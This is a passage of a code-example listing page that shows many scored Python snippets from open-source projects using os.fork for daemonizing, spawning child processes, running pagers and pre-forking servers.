                    popen2._active.append(self)

             
Example 17
From project naali, under directory bin/pymodules/circuits/app, in source file __init__.py.
Score: 10
vote
vote
def _daemonize(self):
        # Do first fork.
        try:
            pid = os.fork()
            if pid > 0:
                # Exit first parent
                raise SystemExit, 0
        except OSError, e:
            print >> sys.stderr, "fork #1 failed: (%d) %s\n" % (errno, str(e))
            raise SystemExit, 1

        # Decouple from parent environment.
        os.chdir(self._path)
        os.umask(077) 
Example 18
From project ibus-anthy, under directory engine, in source file main.py.
Score: 10
vote
vote
def main():
    try:
        locale.setlocale(locale.LC_ALL, "")
    except:
        pass

    daemonize = False
    shortopt = "hd"
    longopt = ["help", "daemonize"]
    try:
        opts, args = getopt.getopt(sys.argv[1:], shortopt, longopt)
    except getopt.GetoptError, err:
        print_help(sys.stderr, 1)

    for o, a in opts:
        if o in ("-h", "--help"):
            print_help(sys.stdout)
        elif o in ("-d", "--daemonize"):
            daemonize = True
        else:
            print >> sys.stderr, "Unknown argument: %s" % o
            print_help(sys.stderr, 1)

    if daemonize:
        if os.fork():
            sys.exit()

    launch_engine()

 
Example 19
From project gecko-dev, under directory js/src/tests/lib, in source file tasks_unix.py.
Score: 10
vote
vote
def spawn_test(test, passthrough = False):
    """Spawn one child, return a task struct."""
    if not passthrough:
        (rout, wout) = os.pipe()
        (rerr, werr) = os.pipe()

        rv = os.fork()

        # Parent.
        if rv:
            os.close(wout)
            os.close(werr)
            return Task(test, rv, rout, rerr)

        # Child.
        os.close(rout)
        os.close(rerr)

        os.dup2(wout, 1)
        os.dup2(werr, 2)

    cmd = test.get_command(test.js_cmd_prefix)
    os.execvp(cmd[0], cmd)

 
Example 20
From project taskhood, under directory django/utils, in source file daemonize.py.
Score: 10
vote
vote
def become_daemon(our_home_dir='.', out_log='/dev/null',
                      err_log='/dev/null', umask=022):
        "Robustly turn into a UNIX daemon, running in our_home_dir."
        # First fork
        try:
            if os.fork() > 0:
                sys.exit(0)     # kill off parent
        except OSError, e:
            sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
            sys.exit(1)
        os.setsid()
        os.chdir(our_home_dir)
        os.umask(umask)

        # Second fork
        try:
            if os.fork() > 0:
                os._exit(0)
        except OSError, e:
            sys.stderr.write("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror))
            os._exit(1)

        si = open('/dev/null', 'r')
        so = open(out_log, 'a+', 0)
        se = open(err_log, 'a+', 0)
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
        # Set custom file descriptors so that they get proper buffering.
        sys.stdout, sys.stderr = so, se
 
Example 21
From project basket-lib, under directory packages/mercurial/hgext, in source file pager.py.
Score: 10
vote
vote
def _runpager(p):
    if not hasattr(os, 'fork'):
        sys.stderr = sys.stdout = util.popen(p, 'wb')
        return
    fdin, fdout = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(fdin)
        os.dup2(fdout, sys.stdout.fileno())
        os.dup2(fdout, sys.stderr.fileno())
        os.close(fdout)
        return
    os.dup2(fdin, sys.stdin.fileno())
    os.close(fdin)
    os.close(fdout)
    try:
        os.execvp('/bin/sh', ['/bin/sh', '-c', p])
    except OSError, e:
        if e.errno == errno.ENOENT:
            # no /bin/sh, try executing the pager directly
            args = shlex.split(p)
            os.execvp(args[0], args)
        else:
            raise

 
Example 22
From project basket-lib, under directory packages/logilab-common, in source file daemon.py.
Score: 10
vote
vote
def daemonize(pidfile):
    # See http://www.erlenstar.demon.co.uk/unix/faq_toc.html#TOC16
    # XXX unix specific
    #
    # fork so the parent can exit
    if os.fork():   # launch child and...
        return 1
    # deconnect from tty and create a new session
    os.setsid()
    # fork again so the parent, (the session group leader), can exit.
    # as a non-session group leader, we can never regain a controlling
    # terminal.
    if os.fork():   # launch child again.
        return 1
    # move to the root to avoit mount pb
    os.chdir('/')
    # set paranoid umask
    os.umask(077) 
Example 23
From project python-spm-master, under directory docs/files, in source file shell.py.
Score: 10
vote
vote
def execute(path, arguments):
    """
    Wrapper around execv():

    * fork()s before exec()ing (in order to run the command in a subprocess)
    * wait for the subprocess to finish before returning (blocks the parent
      process)

    This is **hyper** simplistic. This *does not* handle **many** edge cases.

    *DO NOT DO THIS*: subprocess.check_call() does it better, and handle edge
    cases.
    """
    pid = os.fork()
    if pid == 0:
        try:
            os.execv(path, arguments)
        finally:
            sys.exit(1)  # In case path is not executable
    else:
        try:
            # Wait for subprocess to finish
            os.waitpid(pid, NORMAL_PIDWAIT)
        except OSError:
            pass  # The subprocess was already finish
        return

 
Example 24
From project sinanet.gelso, under directory PasteScript-1.7.5-py2.7.egg/paste/script, in source file serve.py.
Score: 8
vote
vote
def daemonize(self):
        pid = live_pidfile(self.options.pid_file)
        if pid:
            raise DaemonizeException(
                "Daemon is already running (PID: %s from PID file %s)"
                % (pid, self.options.pid_file))

        if self.verbose > 0:
            print 'Entering daemon mode'
        pid = os.fork()
        if pid:
            # The forked process also has a handle on resources, so we
            # *don't* want proper termination of the process, we just
            # want to exit quick (which os._exit() does)
            os._exit(0)
        # Make this the session leader
        os.setsid()
        # Fork again for good measure!
        pid = os.fork()
        if pid:
            os._exit(0)

        # @@: Should we set the umask and cwd now?

        import resource  # Resource usage information.
        maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
        if (maxfd == resource.RLIM_INFINITY):
            maxfd = MAXFD
        # Iterate through and close all file descriptors.
        for fd in range(0, maxfd):
            try:
                os.close(fd)
            except OSError:  # ERROR, fd wasn't open to begin with (ignored)
                pass

        if (hasattr(os, "devnull")):
            REDIRECT_TO = os.devnull
        else:
            REDIRECT_TO = "/dev/null"
        os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
        # Duplicate standard input to standard output and standard error.
        os.dup2(0, 1)  # standard output (1)
        os.dup2(0, 2)  # standard error (2)

     
Example 25
From project aandete, under directory app/lib/python/paste/script, in source file serve.py.
Score: 8
vote
vote
def daemonize(self):
        pid = live_pidfile(self.options.pid_file)
        if pid:
            raise DaemonizeException(
                "Daemon is already running (PID: %s from PID file %s)"
                % (pid, self.options.pid_file))

        if self.verbose > 0:
            print 'Entering daemon mode'
        pid = os.fork()
        if pid:
            # The forked process also has a handle on resources, so we
            # *don't* want proper termination of the process, we just
            # want to exit quick (which os._exit() does)
            os._exit(0)
        # Make this the session leader
        os.setsid()
        # Fork again for good measure!
        pid = os.fork()
        if pid:
            os._exit(0)

        # @@: Should we set the umask and cwd now?

        import resource  # Resource usage information.
        maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
        if (maxfd == resource.RLIM_INFINITY):
            maxfd = MAXFD
        # Iterate through and close all file descriptors.
        for fd in range(0, maxfd):
            try:
                os.close(fd)
            except OSError:  # ERROR, fd wasn't open to begin with (ignored)
                pass

        if (hasattr(os, "devnull")):
            REDIRECT_TO = os.devnull
        else:
            REDIRECT_TO = "/dev/null"
        os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
        # Duplicate standard input to standard output and standard error.
        os.dup2(0, 1)  # standard output (1)
        os.dup2(0, 2)  # standard error (2)
        
     
Example 26
From project searchlight-master, under directory searchlight/tests, in source file utils.py.
Score: 8
vote
vote
def fork_exec(cmd,
              exec_env=None,
              logfile=None):
    """
    Execute a command using fork/exec.

    This is needed for programs system executions that need path
    searching but cannot have a shell as their parent process, for
    example: searchlight.api.  When searchlight.api starts it sets itself as
    the parent process for its own process group.  Thus the pid that
    a Popen process would have is not the right pid to use for killing
    the process group.  This patch gives the test env direct access
    to the actual pid.

    :param cmd: Command to execute as an array of arguments.
    :param exec_env: A dictionary representing the environment with
                     which to run the command.
    :param logile: A path to a file which will hold the stdout/err of
                   the child process.
    """
    env = os.environ.copy()
    if exec_env is not None:
        for env_name, env_val in exec_env.items():
            if callable(env_val):
                env[env_name] = env_val(env.get(env_name))
            else:
                env[env_name] = env_val

    pid = os.fork()
    if pid == 0:
        if logfile:
            fds = [1, 2]
            with open(logfile, 'r+b') as fptr:
                for desc in fds:  # close fds
                    try:
                        os.dup2(fptr.fileno(), desc)
                    except OSError:
                        pass

        args = shlex.split(cmd)
        os.execvpe(args[0], args, env)
    else:
        return pid


 
Example 27
From project indextank-service, under directory nebu/thrift/server, in source file TServer.py.
Score: 8
vote
vote
def serve(self):
    def try_close(file):
      try:
        file.close()
      except IOError, e:
        logging.warning(e, exc_info=True)


    self.serverTransport.listen()
    while True:
      client = self.serverTransport.accept()
      try:
        pid = os.fork()

        if pid: # parent
          # add before collect, otherwise you race w/ waitpid
          self.children.append(pid)
          self.collect_children()

          # Parent must close socket or the connection may not get
          # closed promptly
          itrans = self.inputTransportFactory.getTransport(client)
          otrans = self.outputTransportFactory.getTransport(client)
          try_close(itrans)
          try_close(otrans)
        else:
          itrans = self.inputTransportFactory.getTransport(client)
          otrans = self.outputTransportFactory.getTransport(client)

          iprot = self.inputProtocolFactory.getProtocol(itrans)
          oprot = self.outputProtocolFactory.getProtocol(otrans)

          ecode = 0
          try:
            try:
              while True:
                self.processor.process(iprot, oprot)
            except TTransport.TTransportException, tx:
              pass
            except Exception, e:
              logging.exception(e)
              ecode = 1
          finally:
            try_close(itrans)
            try_close(otrans)

          os._exit(ecode)

      except TTransport.TTransportException, tx:
        pass
      except Exception, x:
        logging.exception(x)


   
Example 28
From project hh-tornado-old, under directory website/tornado, in source file httpserver.py.
Score: 8
vote
vote
def start(self, num_processes=1):
        """Starts this server in the IOLoop.

        By default, we run the server in this process and do not fork any
        additional child process.

        If num_processes is None or <= 0, we detect the number of cores
        available on this machine and fork that number of child
        processes. If num_processes is given and > 1, we fork that
        specific number of sub-processes.

        Since we use processes and not threads, there is no shared memory
        between any server code.

        Note that multiple processes are not compatible with the autoreload
        module (or the debug=True option to tornado.web.Application).
        When using multiple processes, no IOLoops can be created or
        referenced until after the call to HTTPServer.start(n).
        """
        assert not self._started
        self._started = True
        if num_processes is None or num_processes <= 0:
            num_processes = _cpu_count()
        if num_processes > 1 and ioloop.IOLoop.initialized():
            _log.error("Cannot run in multiple processes: IOLoop instance "
                          "has already been initialized. You cannot call "
                          "IOLoop.instance() before calling start()")
            num_processes = 1
        if num_processes > 1:
            _log.info("Pre-forking %d server processes", num_processes)
            for i in range(num_processes):
                if os.fork() == 0:
                    import random
                    from binascii import hexlify
                    try:
                        # If available, use the same method as
                        # random.py
                        seed = long(hexlify(os.urandom(16)), 16)
                    except NotImplementedError:
                        # Include the pid to avoid initializing two
                        # processes to the same value
                        seed(int(time.time() * 1000) ^ os.getpid())
                    random.seed(seed)
                    self.io_loop = ioloop.IOLoop.instance()
                    for fd in self._sockets.keys():
                        self.io_loop.add_handler(fd, self._handle_events,
                                                 ioloop.IOLoop.READ)
                    return
            os.waitpid(-1, 0)
        else:
            if not self.io_loop:
                self.io_loop = ioloop.IOLoop.instance()
            for fd in self._sockets.keys():
                self.io_loop.add_handler(fd, self._handle_events,
                                         ioloop.IOLoop.READ)

     
Example 29
From project Gamez, under directory cherrypy/process, in source file plugins.py.
Score: 8
vote
vote
def start(self):
        if self.finalized:
            self.bus.log('Already deamonized.')
        
        # forking has issues with threads:
        # http://www.opengroup.org/onlinepubs/000095399/functions/fork.html
        # "The general problem with making fork() work in a multi-threaded
        #  world is what to do with all of the threads..."
        # So we check for active threads:
        if threading.activeCount() != 1:
            self.bus.log('There are %r active threads. '
                         'Daemonizing now may cause strange failures.' %
                         threading.enumerate(), level=30)
        
        # See http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
        # (or http://www.faqs.org/faqs/unix-faq/programmer/faq/ section 1.7)
        # and http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/66012
        
        # Finish up with the current stdout/stderr
        sys.stdout.flush()
        sys.stderr.flush()
        
        # Do first fork.
        try:
            pid = os.fork()
            if pid == 0:
                # This is the child process. Continue.
                pass
            else:
                # This is the first parent. Exit, now that we've forked.
                self.bus.log('Forking once.')
                os._exit(0)
        except OSError:
            # Python raises OSError rather than returning negative numbers.
            exc = sys.exc_info()[1]
            sys.exit("%s: fork #1 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.setsid()
        
        # Do second fork
        try:
            pid = os.fork()
            if pid > 0:
                self.bus.log('Forking twice.')
                os._exit(0) # Exit second parent
        except OSError:
            exc = sys.exc_info()[1]
            sys.exit("%s: fork #2 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.chdir("/")
        os.umask(0)
        
        si = open(self.stdin, "r")
        so = open(self.stdout, "a+")
        se = open(self.stderr, "a+")

        # os.dup2(fd, fd2) will close fd2 if necessary,
        # so we don't explicitly close stdin/out/err.
        # See http://docs.python.org/lib/os-fd-ops.html
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
        
        self.bus.log('Daemonized to PID: %s' % os.getpid())
        self.finalized = True
     
Example 30
From project cheetah, under directory src, in source file CheetahWrapper.py.
Score: 8
vote
vote
def _compileOrFill(self):
        C, D, W = self.chatter, self.debug, self.warn
        opts, files = self.opts, self.pathArgs
        if files == ["-"]: 
            self._compileOrFillStdin()
            return
        elif not files and opts.recurse:
            which = opts.idir and "idir" or "current"
            C("Drilling down recursively from %s directory.", which)
            sourceFiles = []
            dir = os.path.join(self.opts.idir, os.curdir)
            os.path.walk(dir, self._expandSourceFilesWalk, sourceFiles)
        elif not files:
            usage(HELP_PAGE1, "Neither files nor -R specified!")
        else:
            sourceFiles = self._expandSourceFiles(files, opts.recurse, True)
        sourceFiles = [os.path.normpath(x) for x in sourceFiles]
        D("All source files found: %s", sourceFiles)
        bundles = self._getBundles(sourceFiles)
        D("All bundles: %s", pprint.pformat(bundles))
        if self.opts.flat:
            self._checkForCollisions(bundles)

        # In parallel mode a new process is forked for each template
        # compilation, out of a pool of size self.opts.parallel. This is not
        # really optimal in all cases (e.g. probably wasteful for small
        # templates), but seems to work well in real life for me.
        #
        # It also won't work for Windows users, but I'm not going to lose any
        # sleep over that.
        if self.opts.parallel > 1:
            bad_child_exit = 0
            pid_pool = set()

            def child_wait():
                pid, status = os.wait()
                pid_pool.remove(pid)
                return os.WEXITSTATUS(status)

            while bundles:
                b = bundles.pop()
                pid = os.fork()
                if pid:
                    pid_pool.add(pid)
                else:
                    self._compileOrFillBundle(b)
                    sys.exit(0)

                if len(pid_pool) == self.opts.parallel:
                    bad_child_exit = child_wait()
                    if bad_child_exit:
                        break

            while pid_pool:
                child_exit = child_wait()
                if not bad_child_exit:
                    bad_child_exit = child_exit

            if bad_child_exit:
                sys.exit("Child process failed, exited with code %d" % bad_child_exit)

        else:
            for b in bundles:
                self._compileOrFillBundle(b)

     
Example 31
From project django-collector, under directory collector/helpers, in source file daemon.py.
Score: 8
vote
vote
def daemonize(self):
		"""
		do the UNIX double-fork magic, see Stevens' "Advanced 
		Programming in the UNIX Environment" for details (ISBN 0201563177)
		http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
		"""
		try: 
			pid = os.fork() 
			if pid > 0:
				# exit first parent
				sys.exit(0) 
		except OSError, e: 
			sys.stderr.write("fork #1 failed: %d (%s)\n" % (e.errno, e.strerror))
			sys.exit(1)
	
		# decouple from parent environment
		os.chdir("/") 
		os.setsid() 
		os.umask(0) 
	
		# do second fork
		try: 
			pid = os.fork() 
			if pid > 0:
				# exit from second parent
				sys.exit(0) 
		except OSError, e: 
			sys.stderr.write("fork #2 failed: %d (%s)\n" % (e.errno, e.strerror))
			sys.exit(1) 
	
		# redirect standard file descriptors
		sys.stdout.flush()
		sys.stderr.flush()
		si = file(self.stdin, 'r')
		so = file(self.stdout, 'a+')
		se = file(self.stderr, 'a+', 0)
		os.dup2(si.fileno(), sys.stdin.fileno())
		os.dup2(so.fileno(), sys.stdout.fileno())
		os.dup2(se.fileno(), sys.stderr.fileno())
	
		# write pidfile
		atexit.register(self.delpid)
		pid = str(os.getpid())
		file(self.pidfile,'w+').write("%s\n" % pid)
	
	 
Example 32
From project Sick-Beard, under directory cherrypy/process, in source file plugins.py.
Score: 8
vote
vote
def start(self):
        if self.finalized:
            self.bus.log('Already deamonized.')
        
        # forking has issues with threads:
        # http://www.opengroup.org/onlinepubs/000095399/functions/fork.html
        # "The general problem with making fork() work in a multi-threaded
        #  world is what to do with all of the threads..."
        # So we check for active threads:
        if threading.activeCount() != 1:
            self.bus.log('There are %r active threads. '
                         'Daemonizing now may cause strange failures.' % 
                         threading.enumerate(), level=30)
        
        # See http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
        # (or http://www.faqs.org/faqs/unix-faq/programmer/faq/ section 1.7)
        # and http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/66012
        
        # Finish up with the current stdout/stderr
        sys.stdout.flush()
        sys.stderr.flush()
        
        # Do first fork.
        try:
            pid = os.fork()
            if pid == 0:
                # This is the child process. Continue.
                pass
            else:
                # This is the first parent. Exit, now that we've forked.
                self.bus.log('Forking once.')
                os._exit(0)
        except OSError, exc:
            # Python raises OSError rather than returning negative numbers.
            sys.exit("%s: fork #1 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.setsid()
        
        # Do second fork
        try:
            pid = os.fork()
            if pid > 0:
                self.bus.log('Forking twice.')
                os._exit(0) # Exit second parent
        except OSError, exc:
            sys.exit("%s: fork #2 failed: (%d) %s\n"
                     % (sys.argv[0], exc.errno, exc.strerror))
        
        os.chdir("/")
        os.umask(0)
        
        si = open(self.stdin, "r")
        so = open(self.stdout, "a+")
        se = open(self.stderr, "a+")

        # os.dup2(fd, fd2) will close fd2 if necessary,
        # so we don't explicitly close stdin/out/err.
        # See http://docs.python.org/lib/os-fd-ops.html
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
        
        self.bus.log('Daemonized to PID: %s' % os.getpid())
        self.finalized = True
     
Example 33
From project ibus-anthy, under directory engine/python3, in source file main.py.
Score: 8
vote
vote
def main():
    try:
        locale.setlocale(locale.LC_ALL, '')
    except:
        pass

    exec_by_ibus = False
    daemonize = False
    xml = False

    shortopt = 'ihdx'
    longopt = ['ibus', 'help', 'daemonize', 'xml']

    try:
        opts, args = getopt.getopt(sys.argv[1:], shortopt, longopt)
    except getopt.GetoptError as err:
        print_help(sys.stderr, 1)

    for o, a in opts:
        if o in ('-h', '--help'):
            print_help(sys.stdout)
        elif o in ('-d', '--daemonize'):
            daemonize = True
        elif o in ('-i', '--ibus'):
            exec_by_ibus = True
        elif o in ('-x', '--xml'):
            xml = True
        else:
            print('Unknown argument: %s' % o, file=sys.stderr)
            print_help(sys.stderr, 1)

    if daemonize:
        if os.fork():
            sys.exit()

    if xml:
        resync_engine_file()
        print_xml()
        return

    launch_engine(exec_by_ibus)

 
Example 34
From project ibus-anthy, under directory engine/python2, in source file main.py.
Score: 8
vote
vote
def main():
    try:
        locale.setlocale(locale.LC_ALL, '')
    except:
        pass

    exec_by_ibus = False
    daemonize = False
    xml = False

    shortopt = 'ihdx'
    longopt = ['ibus', 'help', 'daemonize', 'xml']

    try:
        opts, args = getopt.getopt(sys.argv[1:], shortopt, longopt)
    except getopt.GetoptError, err:
        print_help(sys.stderr, 1)

    for o, a in opts:
        if o in ('-h', '--help'):
            print_help(sys.stdout)
        elif o in ('-d', '--daemonize'):
            daemonize = True
        elif o in ('-i', '--ibus'):
            exec_by_ibus = True
        elif o in ('-x', '--xml'):
            xml = True
        else:
            print >> sys.stderr, 'Unknown argument: %s' % o
            print_help(sys.stderr, 1)

    if daemonize:
        if os.fork():
            sys.exit()

    if xml:
        resync_engine_file()
        print_xml()
        return

    launch_engine(exec_by_ibus)

 
Example 35
From project gecko-dev, under directory python/psutil/test, in source file test_psutil.py.
Score: 8
vote
vote
def test_zombie_process(self):
        # Note: in this test we'll be creating two sub processes.
        # Both of them are supposed to be freed / killed by
        # reap_children() as they are attributable to 'us'
        # (os.getpid()) via children(recursive=True).
        src = textwrap.dedent("""\
        import os, sys, time, socket
        child_pid = os.fork()
        if child_pid > 0:
            time.sleep(3000)
        else:
            # this is the zombie process
            s = socket.socket(socket.AF_UNIX)
            s.connect('%s')
            if sys.version_info < (3, ):
                pid = str(os.getpid())
            else:
                pid = bytes(str(os.getpid()), 'ascii')
            s.sendall(pid)
            s.close()
        """ % TESTFN)
        sock = None
        try:
            sock = socket.socket(socket.AF_UNIX)
            sock.settimeout(GLOBAL_TIMEOUT)
            sock.bind(TESTFN)
            sock.listen(1)
            pyrun(src)
            conn, _ = sock.accept()
            select.select([conn.fileno()], [], [], GLOBAL_TIMEOUT)
            zpid = int(conn.recv(1024))
            zproc = psutil.Process(zpid)
            # Make sure we can re-instantiate the process after its
            # status changed to zombie and at least be able to
            # query its status.
            # XXX should we also assume ppid should be querable?
            call_until(lambda: zproc.status(), "ret == psutil.STATUS_ZOMBIE")
            self.assertTrue(psutil.pid_exists(zpid))
            zproc = psutil.Process(zpid)
            descendants = [x.pid for x in psutil.Process().children(
                           recursive=True)]
            self.assertIn(zpid, descendants)
        finally:
            if sock is not None:
                sock.close()
            reap_children(search_all=True)

     
Example 36
From project ClusterNap, under directory bin, in source file daemon3x.py.
Score: 8
vote
vote
def daemonize(self):
		"""Deamonize class. UNIX double fork mechanism."""

		try: 
			pid = os.fork() 
			if pid > 0:
				# exit first parent
				sys.exit(0) 
		except OSError as err: 
			sys.stderr.write('fork #1 failed: {0}\n'.format(err))
			sys.exit(1)
	
		# decouple from parent environment
		os.chdir('/') 
		os.setsid() 
		os.umask(0) 
	
		# do second fork
		try: 
			pid = os.fork() 
			if pid > 0:

				# exit from second parent
				sys.exit(0) 
		except OSError as err: 
			sys.stderr.write('fork #2 failed: {0}\n'.format(err))
			sys.exit(1) 
	
		# redirect standard file descriptors
		sys.stdout.flush()
		sys.stderr.flush()
		si = open(os.devnull, 'r')
		so = open(os.devnull, 'a+')
		se = open(os.devnull, 'a+')

		os.dup2(si.fileno(), sys.stdin.fileno())
		os.dup2(so.fileno(), sys.stdout.fileno())
		os.dup2(se.fileno(), sys.stderr.fileno())
	
		# write pidfile
		atexit.register(self.delpid)

		pid = str(os.getpid())
		with open(self.pidfile,'w+') as f:
			f.write(pid + '\n')
	
	 
Example 37
From project distutils2, under directory src/distutils2, in source file spawn.py.
Score: 8
vote
vote
def _spawn_posix(cmd, search_path=1, verbose=0, dry_run=0):
    log.info(' '.join(cmd))
    if dry_run:
        return
    exec_fn = search_path and os.execvp or os.execv
    pid = os.fork()

    if pid == 0:  # in the child
        try:
            exec_fn(cmd[0], cmd)
        except OSError, e:
            sys.stderr.write("unable to execute %s: %s\n" %
                             (cmd[0], e.strerror))
            os._exit(1)

        sys.stderr.write("unable to execute %s for unknown reasons" % cmd[0])
        os._exit(1)
    else:   # in the parent
        # Loop until the child either exits or is terminated by a signal
        # (ie. keep waiting if it's merely stopped)
        while 1:
            try:
                pid, status = os.waitpid(pid, 0)
            except OSError, exc:
                import errno
                if exc.errno == errno.EINTR:
                    continue
                raise DistutilsExecError, \
                      "command '%s' failed: %s" % (cmd[0], exc[-1])
            if os.WIFSIGNALED(status):
                raise DistutilsExecError, \
                      "command '%s' terminated by signal %d" % \
                      (cmd[0], os.WTERMSIG(status))

            elif os.WIFEXITED(status):
                exit_status = os.WEXITSTATUS(status)
                if exit_status == 0:
                    return   # hey, it succeeded!
                else:
                    raise DistutilsExecError, \
                          "command '%s' failed with exit status %d" % \
                          (cmd[0], exit_status)

            elif os.WIFSTOPPED(status):
                continue

            else:
                raise DistutilsExecError, \
                      "unknown error executing '%s': termination status %d" % \
                      (cmd[0], status)

 
Example 38
From project sabayon, under directory lib, in source file protosession.py.
Score: 7
vote
vote
def __open_x_connection (self, display_name, xauth_file):
        (pipe_r, pipe_w) = os.pipe ()
        pid = os.fork ()
        if pid == 0: # Child process
            os.close (pipe_r)
            new_environ = os.environ.copy ()
            new_environ["DISPLAY"] = display_name
            new_environ["XAUTHORITY"] = xauth_file
            argv = [ "python", "-c",
                     "import gtk, os, sys; os.write (int (sys.argv[1]), 'Y'); gtk.main ()" ,
                     str (pipe_w) ]
            os.execvpe (argv[0], argv, new_environ)
        os.close (pipe_w)
        while True:
            try:
                select.select ([pipe_r], [], [])
                break
            except select.error, (err, errstr):
                if err != errno.EINTR:
                    raise
        os.close (pipe_r)

    #
    # FIXME: we have a re-entrancy issue here - if while we're
    # runing the mainloop we re-enter, then we'll install another
    # SIGUSR1 handler and everything will break
    #
     
Example 39
From project eventlet, under directory tests, in source file greenio_test.py.
Score: 5
vote
vote
def test_server_starvation(self, sendloops=15):
        recvsize = 2 * min_buf_size()
        sendsize = 10000 * recvsize
        
        results = [[] for i in xrange(5)]
        
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        listener.bind(('127.0.0.1', 0))
        port = listener.getsockname()[1]
        listener.listen(50)
        
        base_time = time.time()
        
        def server(my_results):
            (sock, addr) = listener.accept()
            
            datasize = 0
            
            t1 = None
            t2 = None
            try:
                while True:
                    data = sock.recv(recvsize)
                    if not t1:
                        t1 = time.time() - base_time
                    if not data:
                        t2 = time.time() - base_time
                        my_results.append(datasize)
                        my_results.append((t1,t2))
                        break
                    datasize += len(data)
            finally:
                sock.close()

        def client():
            pid = os.fork()
            if pid:
                return pid
    
            client = _orig_sock.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('127.0.0.1', port))

            bufsized(client, size=sendsize)

            for i in range(sendloops):
                client.sendall(s2b('*') * sendsize)
            client.close()
            os._exit(0)

        clients = []
        servers = []
        for r in results:
            servers.append(eventlet.spawn(server, r))
        for r in results:
            clients.append(client())

        for s in servers:
            s.wait()
        for c in clients:
            os.waitpid(c, 0)

        listener.close()

        # now test that all of the server receive intervals overlap, and
        # that there were no errors.
        for r in results:
            assert len(r) == 2, "length is %d not 2!: %s\n%s" % (len(r), r, results)
            assert r[0] == sendsize * sendloops
            assert len(r[1]) == 2
            assert r[1][0] is not None
            assert r[1][1] is not None

        starttimes = sorted(r[1][0] for r in results)
        endtimes = sorted(r[1][1] for r in results)
        runlengths = sorted(r[1][1] - r[1][0] for r in results)

        # assert that the last task started before the first task ended
        # (our no-starvation condition)
        assert starttimes[-1] < endtimes[0], "Not overlapping: starts %s ends %s" % (starttimes, endtimes)

        maxstartdiff = starttimes[-1] - starttimes[0]

        assert maxstartdiff * 2 < runlengths[0], "Largest difference in starting times more than twice the shortest running time!"
        assert runlengths[0] * 2 > runlengths[-1], "Longest runtime more than twice as long as shortest!"

 
Example 40
From project sinanet.gelso, under directory PasteScript-1.7.5-py2.7.egg/paste/script/util, in source file subprocess24.py.
Score: 5
vote
vote
def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Execute program (POSIX version)"""

            if isinstance(args, types.StringTypes):
                args = [args]

            if shell:
                args = ["/bin/sh", "-c"] + args

            if executable == None:
                executable = args[0]

            # For transferring possible exec failure from child to parent
            # The first char specifies the exception type: 0 means
            # OSError, 1 means some other error.
            errpipe_read, errpipe_write = os.pipe()
            self._set_cloexec_flag(errpipe_write)

            self.pid = os.fork()
            if self.pid == 0:
                # Child
                try:
                    # Close parent's pipe ends
                    if p2cwrite:
                        os.close(p2cwrite)
                    if c2pread:
                        os.close(c2pread)
                    if errread:
                        os.close(errread)
                    os.close(errpipe_read)

                    # Dup fds for child
                    if p2cread:
                        os.dup2(p2cread, 0)
                    if c2pwrite:
                        os.dup2(c2pwrite, 1)
                    if errwrite:
                        os.dup2(errwrite, 2)

                    # Close pipe fds.  Make sure we doesn't close the same
                    # fd more than once.
                    if p2cread:
                        os.close(p2cread)
                    if c2pwrite and c2pwrite not in (p2cread,):
                        os.close(c2pwrite)
                    if errwrite and errwrite not in (p2cread, c2pwrite):
                        os.close(errwrite)

                    # Close all other fds, if asked for
                    if close_fds:
                        self._close_fds(but=errpipe_write)

                    if cwd != None:
                        os.chdir(cwd)

                    if preexec_fn:
                        apply(preexec_fn)

                    if env == None:
                        os.execvp(executable, args)
                    else:
                        os.execvpe(executable, args, env)

                except:
                    exc_type, exc_value, tb = sys.exc_info()
                    # Save the traceback and attach it to the exception object
                    exc_lines = traceback.format_exception(exc_type,
                                                           exc_value,
                                                           tb)
                    exc_value.child_traceback = ''.join(exc_lines)
                    os.write(errpipe_write, pickle.dumps(exc_value))

                # This exitcode won't be reported to applications, so it
                # really doesn't matter what we return.
                os._exit(255)

            # Parent
            os.close(errpipe_write)
            if p2cread and p2cwrite:
                os.close(p2cread)
            if c2pwrite and c2pread:
                os.close(c2pwrite)
            if errwrite and errread:
                os.close(errwrite)

            # Wait for exec to fail or succeed; possibly raising exception
            data = os.read(errpipe_read, 1048576) # Exceptions limited to 1 MB
            os.close(errpipe_read)
            if data != "":
                os.waitpid(self.pid, 0)
                child_exception = pickle.loads(data)
                raise child_exception


         
Example 41
From project elements, under directory lib/elements/async, in source file server.py.
Score: 5
vote
vote
def __init__ (self, hosts=None, daemonize=False, user=None, group=None, umask=None, chroot=None, long_running=False,
                  loop_interval=1, timeout=None, timeout_interval=10, worker_count=0, channel_count=0,
                  event_manager=None, print_settings=True):
        """
        Create a new Server instance.

        @param hosts            (tuple)     A tuple that contains one or more tuples of host ip/port pairs.
        @param daemonize        (bool)      Indicates that the process should be daemonized.
        @param user             (str)       The process user.
        @param group            (str)       The process group.
        @param umask            (octal)     The process user mask.
